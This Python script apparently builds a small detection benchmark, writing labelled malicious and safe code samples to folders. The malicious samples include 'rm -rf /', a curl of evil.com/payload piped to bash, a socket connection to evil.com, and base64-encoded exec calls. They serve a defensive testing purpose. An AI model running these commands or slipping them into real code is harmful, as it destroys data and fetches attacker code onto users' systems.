# download_dataset.py
import os
import json
from pathlib import Path

def create_benchmark_dataset():
    """Create a small benchmark dataset with known malicious and safe samples."""
    
    # Create folders
    os.makedirs("benchmark_dataset/malicious", exist_ok=True)
    os.makedirs("benchmark_dataset/safe", exist_ok=True)
    
    # Malicious samples (known patterns)
    malicious_samples = {
        "mal_1.py": 'import os\nexec("import socket; socket.socket().connect(("evil.com", 4444))")',
        "mal_2.py": 'import base64\ncode = "aW1wb3J0IG9zO29zLnN5c3RlbSgiY2FsYy5leGUiKQ=="\nexec(base64.b64decode(code).decode())',
        "mal_3.js": 'const { exec } = require("child_process");\nexec("rm -rf /")',
        "mal_4.js": 'const base64 = require("base64-js");\nconst code = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImNhbGMuZXhlIik=";\neval(Buffer.from(code, "base64").toString());',
        "mal_5.go": 'package main\nimport "os/exec"\nfunc main() { exec.Command("sh", "-c", "rm -rf /").Run() }',
        "mal_6.go": 'package main\nimport "syscall"\nfunc main() { syscall.Exec("/bin/sh", []string{"sh", "-c", "echo malicious"}, nil) }',
        "mal_7.py": 'import subprocess\nsubprocess.Popen(["python3", "-c", "import os; os.system(\"whoami\")"])',
        "mal_8.js": 'const child_process = require("child_process");\nchild_process.execSync("curl http://evil.com/payload | bash")',
    }
    
    # Safe samples (benign code)
    safe_samples = {
        "safe_1.py": 'print("Hello World")\ndef add(a, b): return a + b',
        "safe_2.py": 'import math\nmath.sqrt(16)',
        "safe_3.js": 'console.log("Hello World");\nconst math = require("math");\nmath.sqrt(16);',
        "safe_4.go": 'package main\nimport "fmt"\nfunc main() { fmt.Println("Hello") }',
        "safe_5.py": 'import json\ndata = {"name": "test"}\njson.dumps(data)',
        "safe_6.js": 'const fs = require("fs");\nfs.readFileSync("file.txt", "utf8");',
    }
    
    # Write malicious samples
    for filename, content in malicious_samples.items():
        filepath = Path("benchmark_dataset/malicious") / filename
        with open(filepath, "w") as f:
            f.write(content)
        print(f"[*] Created malicious: {filename}")
    
    # Write safe samples
    for filename, content in safe_samples.items():
        filepath = Path("benchmark_dataset/safe") / filename
        with open(filepath, "w") as f:
            f.write(content)
        print(f"[*] Created safe: {filename}")
    
    print(f"\n[✓] Created {len(malicious_samples)} malicious and {len(safe_samples)} safe files.")
    print("[*] Dataset ready in ./benchmark_dataset/")

if __name__ == "__main__":
    create_benchmark_dataset()